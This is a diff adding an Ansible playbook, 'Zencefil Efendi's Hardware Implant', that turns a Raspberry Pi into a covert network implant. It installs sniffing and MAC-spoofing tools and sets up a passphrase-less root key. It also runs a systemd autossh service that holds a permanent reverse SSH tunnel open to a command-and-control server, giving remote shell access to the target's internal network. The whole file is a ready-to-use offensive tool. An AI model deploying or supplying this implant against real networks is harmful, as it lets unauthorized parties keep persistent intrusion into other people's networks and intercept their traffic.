@@ -1,0 +1,84 @@
+# ==============================================================================
+# 🍯 Zencefil Efendi's Hardware Implant (Dropbox) Auto-Provisioner
+# Description: An Ansible playbook to turn a clean Raspberry Pi (or similar Linux SBC)
+#              into a stealthy Network Implant. It automatically configures an 
+#              autossh reverse tunnel to call home to your C2 server, providing 
+#              a permanent bridgehead into the target's physical network.
+# Usage: ansible-playbook -i "192.168.1.100," dropbox_setup.yml
+# ==============================================================================
+
+---
+- name: 🔌 Provision Zencefil Network Implant
+  hosts: all
+  become: yes
+  vars:
+    # ⚠️ CHANGE THESE TO MATCH YOUR C2 INFRASTRUCTURE ⚠️
+    c2_server_ip: "198.51.100.42"
+    c2_ssh_port: "22"
+    c2_ssh_user: "zencefil_operator"
+    implant_reverse_port: "9090" # Port on your C2 that will map to the implant's SSH
+
+  tasks:
+    - name: Update apt cache and install required tactical packages
+      apt:
+        name:
+          - autossh
+          - nmap
+          - tcpdump
+          - macchanger
+        state: present
+        update_cache: yes
+
+    - name: Generate SSH keypair for the implant (No passphrase)
+      openssh_keypair:
+        path: /root/.ssh/id_rsa
+        type: ed25519
+        state: present
+        force: no
+
+    - name: IMPORTANT - Operator Action Required
+      debug:
+        msg: "Take the contents of /root/.ssh/id_rsa.pub and add it to the ~/.ssh/authorized_keys file of the '{{ c2_ssh_user }}' user on your C2 server ({{ c2_server_ip }})."
+
+    - name: Create AutoSSH Systemd Service for persistent Reverse Tunnel
+      copy:
+        dest: /etc/systemd/system/zencefil-tunnel.service
+        content: |
+          [Unit]
+          Description=🍯 Zencefil AutoSSH Reverse Tunnel
+          After=network-online.target
+          Wants=network-online.target
+
+          [Service]
+          Environment="AUTOSSH_GATETIME=0"
+          Environment="AUTOSSH_POLL=60"
+          # -N: Do not execute a remote command
+          # -R: Bind remote port to local port (Reverse Tunnel)
+          # -o StrictHostKeyChecking=no: Ignore first-time connection prompts
+          ExecStart=/usr/bin/autossh -M 0 -N -q -o "ServerAliveInterval=30" -o "ServerAliveCountMax=3" -o "StrictHostKeyChecking=no" -R {{ implant_reverse_port }}:localhost:22 {{ c2_ssh_user }}@{{ c2_server_ip }} -p {{ c2_ssh_port }} -i /root/.ssh/id_rsa
+          Restart=always
+          RestartSec=60
+
+          [Install]
+          WantedBy=multi-user.target
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Enable and start the Zencefil Tunnel service
+      systemd:
+        name: zencefil-tunnel
+        enabled: yes
+        state: restarted
+        daemon_reload: yes
+
+    - name: Disable IPv6 to prevent DNS leaks and simplify routing
+      sysctl:
+        name: net.ipv6.conf.all.disable_ipv6
+        value: '1'
+        state: present
+        reload: yes
+
+    - name: Print Connection Instructions
+      debug:
+        msg: "Implant Provisioned! Once deployed on the target network, SSH into your C2 Server ({{ c2_server_ip }}) and run: ssh -p {{ implant_reverse_port }} root@localhost to access the target's internal network."
